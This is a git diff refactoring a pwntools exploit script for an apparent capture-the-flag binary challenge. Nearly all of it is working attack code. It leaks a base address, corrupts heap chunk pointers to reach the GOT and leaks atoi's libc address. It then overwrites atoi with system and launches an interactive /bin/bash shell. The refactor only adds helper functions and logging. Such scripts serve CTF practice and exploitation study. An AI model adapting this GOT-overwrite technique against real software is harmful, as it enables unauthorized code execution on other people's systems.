@@ -11,11 +11,10 @@ FLAGFILE = 'chall/flag.txt'
 TERMINAL_CONFIG = ['tmux', 'split-window', '-h', '-F', '#{pane_pid}', '-P']
 
 context.binary = ELF(NAME)
-context.terminal = TERMINAL_CONFIG
-
 LIBC = ELF('chall/libc.so.6')
 LD = ELF('chall/ld-linux-x86-64.so.2')
 ENV = {"LD_PRELOAD": LIBC.path}
+context.terminal = TERMINAL_CONFIG
 
 START_OFS = 0x4080
 PREV_OFS = 0x4088
@@ -23,8 +22,7 @@ CURR_OFS = 0x4090
 
 MAIN_OFS = 0x1662
 ATOI_GOT_OFS = 0x4038
-RESET_OFS = 0x14a4
-CREATE_LEVEL_RET_OFS = 0x12df
+CREATE_LEVEL_RET_OFS = 0x12df   # Only used for debugging
 
 ATOI_LIBC_OFS = 0x3d4a0
 SYSTEM_LIBC_OFS = 0x4c490
@@ -54,33 +52,46 @@ else:
     create_flag(FLAGFILE)
     p = process([LD.path, context.binary.path], env=ENV)
 
-p.recvuntil(b'gift: ')
-main_addr = p.recvuntil(b'\n').strip()[2:]
-print(main_addr)
-main_addr = unhex(main_addr)
-main_addr = unpack(main_addr, 'all', endian='big')
+
+def leak_main_addr() -> int:
+    p.recvuntil(b'gift: ')
+    main_addr = p.recvuntil(b'\n').strip()[2:]
+    return unpack(unhex(main_addr), 'all', endian='big')
+
+
+def create_level(level_index: int) -> None:
+    p.sendlineafter(b'Choice: ', b'1')
+    p.sendlineafter(b'index: ', str(level_index).encode())
+
+
+def edit_level(data: bytes) -> None:
+    p.sendlineafter(b'Choice: ', b'2')
+    p.sendlineafter(b'data: ', data)
+
+
+def read_level() -> bytes:
+    p.sendlineafter(b'Choice: ', b'3')
+    p.recvuntil(b'data: ')
+    return p.recvline()
+
+def change_level(level_index: int) -> None:
+    p.sendlineafter(b'Choice: ', b'4')
+    p.sendlineafter(b'index: ', str(level_index).encode())
+
+
+def reset_level() -> None:
+    p.sendlineafter(b'Choice: ', b'5')
+
+
+main_addr = leak_main_addr()
 base_addr = main_addr - MAIN_OFS
-print(hex(base_addr))
+log.info(f'&base: {hex(base_addr)}')
 
 # Create two adjacent chunks, Control and Victim (start->next[0] and
 # start->next[1]) (and a third just to increment prev)
-p.recvuntil(b'Choice: ')
-p.sendline(b'1')    # Create level
-p.recvuntil(b'index: ')
-# Level index 0
-p.sendline(b'0')
-
-p.recvuntil(b'Choice: ')
-p.sendline(b'1')    # Create level
-p.recvuntil(b'index: ')
-# Level index 1
-p.sendline(b'1')
-
-p.recvuntil(b'Choice: ')
-p.sendline(b'1')    # Create level
-p.recvuntil(b'index: ')
-# Level index 2
-p.sendline(b'2')
+create_level(0)
+create_level(1)
+create_level(2)
 
 # Change curr to Control chunk (start->next[0]) and overwrite Victim chunk
 # with address 0x40 bytes before atoi GOT address
@@ -92,47 +103,29 @@ PADDING3 = b'c' * (0x10-1)
 PAYLOAD = PADDING1 + PADDING2 + TARGET_ADDR + PADDING3
 
 # set curr to start->next[0]
-p.recvuntil(b'Choice: ')
-p.sendline(b'4')    # Explore
-p.recvuntil(b'index: ')
-p.sendline(b'0')
+change_level(0)
 
 # overwrite into start->next[1]
-p.recvuntil(b'Choice: ')
-p.sendline(b'2')    # Edit level
-p.recvuntil(b'data: ')
-p.send(PAYLOAD)
-p.sendline(b'')
-
-# Reset to curr = start
-p.recvuntil(b'Choice: ')
-p.sendline(b'5')    # Reset
-#p.sendline(b'5')    # Reset
+edit_level(PAYLOAD)
 
 # Change 'curr' to Victim chunk
 # Change to start->next[1] (corrupted)
 # Change to curr->next[0] (GOT entry)
 
+# Reset to curr = start
+reset_level()
+
 # Set curr = start->next[1] (victim)
-p.recvuntil(b'Choice: ')
-p.sendline(b'4')    # Explore
-p.recvuntil(b'index: ')
-p.sendline(b'1')    # Change curr to start->next[1]
+change_level(1)
 
 # Set curr = start->next[1]->next[0] (in GOT)
-p.recvuntil(b'Choice: ')
-p.sendline(b'4')    # Explore
-p.recvuntil(b'index: ')
-p.sendline(b'0')    # Change curr to start->next[1]->next[0]
+change_level(0)
 
 # Leak atoi address from GOT with 'test_level'
-p.recvuntil(b'Choice: ')
-p.sendline(b'3')
-p.recvuntil(b'data: ')
-leaked = p.recvuntil(b'\n')
+leaked = read_level()
 addr_atoi_bytes = leaked[:8]
 addr_atoi = unpack(addr_atoi_bytes, 'all')
-print(f'&atoi: {hex(addr_atoi)}')
+log.info(f'&atoi: {hex(addr_atoi)}')
 
 # Calculate address of system.
 libc_base = addr_atoi - ATOI_LIBC_OFS
@@ -141,12 +134,10 @@ PAYLOAD2 = p64(addr_system)
 
 # Overwrite atoi address in GOT to &system with 'edit_level' (this has
 # side-effect of mangling address of exit in the GOT)
-p.recvuntil(b'Choice: ')
-p.sendline(b'2')    # Edit level
-p.recvuntil(b'data: ')
-p.sendline(PAYLOAD2)
+edit_level(PAYLOAD2)
 
 # Send `/bin/bash` at next menu prompt
 p.sendline(b'/bin/bash')
-
+p.recvuntil(b'Choice: ')
+log.warning('pwned - enter shell commands')
 p.interactive()
